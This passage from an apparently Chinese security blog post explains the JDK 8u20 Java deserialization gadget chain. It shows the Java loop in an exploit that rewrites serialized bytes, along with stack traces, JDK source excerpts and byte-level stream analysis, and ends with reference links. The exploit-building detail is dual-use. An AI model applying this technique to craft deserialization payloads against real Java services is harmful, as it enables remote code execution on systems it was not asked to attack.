可以看到这里返回了-1，一直回溯过去，导致4个`in.read()`都会返回-1，抛出`EOFException`。

这里使用的解决方法是将`AnnotationInvocationHandler`的`classDescFlags`添加了`SC_WRITE_METHOD`标志，这样就不会进入if判断中，一开始就不会将`defaultDataEnd=True`，也就解决了这个问题，使得`ois.readInt()`能够有机会读取到Int。
### 困惑2
exp3里有这么一段:
```
        // 运行到BeanContextSupport.deserialize()中此时ois.readInt()时面对的序列化数据可能是个TC_OBJECT或者TC_NULL，为了让攻击顺利，必须让ois.readInt()面对的序列化数据是TC_BLOCKDATA包裹的整型变量0
        // 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 ->
        // 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78
        for(int i = 0; i < bytes.length; i++){
            if(bytes[i] == 0x70 && bytes[i+1] == 0x77 && bytes[i+2] == 0x04 && bytes[i+3] == 0x00 && bytes[i + 4] == 0x00 && bytes[i+5] == 0x00 && bytes[i+6] == 0x00 && bytes[i+7] == 0x78){
                System.out.println("[+] Change 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78 -> 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78");
                bytes[i] = 0x77;
                bytes[i+1] = 0x04;
                bytes[i+2] = 0x00;
                bytes[i+6] = 0x70;
                break;
            }
        }
```
为什么要这么修改字节码呢？我们可以试试注释这段代码再运行，发现会出现报错:
```
at java.io.DataInputStream.readInt(DataInputStream.java:392)
at java.io.ObjectInputStream$BlockDataInputStream.readInt(ObjectInputStream.java:2823)
at java.io.ObjectInputStream.readInt(ObjectInputStream.java:972)
at java.beans.beancontext.BeanContextSupport.deserialize(BeanContextSupport.java:931)
at java.beans.beancontext.BeanContextSupport.readObject(BeanContextSupport.java:1084)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:483)
at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896)
at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
at java.util.HashSet.readObject(HashSet.java:333)
at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
at java.lang.reflect.Method.invoke(Method.java:483)
at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)
at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896)
at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)
at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)
at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)
at jdk8u20EXP2.main(jdk8u20EXP2.java:128)

Process finished with exit code 1
```
我们跟进`BeanContextSupport#readObject`看看，其代码如下:
```

private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {

    synchronized(BeanContext.globalHierarchyLock) {
        ois.defaultReadObject();

        initialize();

        bcsPreDeserializationHook(ois);

        if (serializable > 0 && this.equals(getBeanContextPeer()))
            readChildren(ois);

        deserialize(ois, bcmListeners = new ArrayList(1));
    }
}
```
可以看到在`readChildren`之后还会执行`deserialize`方法，继续跟进:
```

protected final void deserialize(ObjectInputStream ois, Collection coll) throws IOException, ClassNotFoundException {
    int count = 0;

    count = ois.readInt();

    while (count-- > 0) {
        coll.add(ois.readObject());
    }
}
```
他这里会尝试从反序列化流中读取一个Int，如果Int大于0的话，就会继续执行`readObject`，这显然是我们不想看到的，所以我们需要将其改为0，那么exp3是如何修改的呢？
```
TC_NULL - 0x70          // old
TC_BLOCKDATA - 0x77
  Length - 4 - 0x04
  Contents - 0x00000000
TC_ENDBLOCKDATA - 0x78

TC_BLOCKDATA - 0x77     // new
  Length - 4 - 0x04
  Contents - 0x00000000
TC_NULL - 0x70
TC_ENDBLOCKDATA - 0x78
```
我们手动修改字节码的原因是我们try-catch异常之后导致正常的反序列化流程部分断开，后续的一部分代码没有正常执行，所以我们需要手动将后续的链"接上"，具体的方法如上，将要被读取的Int上移，在java中一个假如我们序列化一个Int:
```
out.writeInt(120);
```
其会得到以下几个字节码:
> 77 04 00 00 00 78：这段信息描述了整数120的详细信息。
> **【77】**TC_BLOCKDATA：可选的数据块，参考后边的章节就知道，所有基础类型数据的序列化都会使用数据块的结构；
> **【04】**该值表示当前写入数据120值占用的字节数，因为是int类型的数据，所以这个120的数据应该占用4个字节；
> **【00 00 00 78】**这段数据表示120的**值**；十六进制0x78转换成十进制就是120；

而0x70即TC_NULL是一个终止符，其具体意义如下:
> TC_NULL一个字节长度的数据，表示null值，一般这个值表示的是对象的空引用，也可以用于表示递归继承终止符

所以exp3上述两个手动修改字节码的目的就是为了弥补反序列化异常终止之后的后果，使得后续反序列化能够正常运行。
## 参考文章
- https://paper.seebug.org/1232/
- https://xz.aliyun.com/t/7240
- https://xz.aliyun.com/t/8277
- https://xz.aliyun.com/t/9566
- https://xz.aliyun.com/t/9765
- https://mp.weixin.qq.com/s/SMq6aE5-qV9cINv1-74RgA
- https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA
- https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/
- https://www.anquanke.com/post/id/87270
- https://blog.csdn.net/silentbalanceyh/article/details/8183849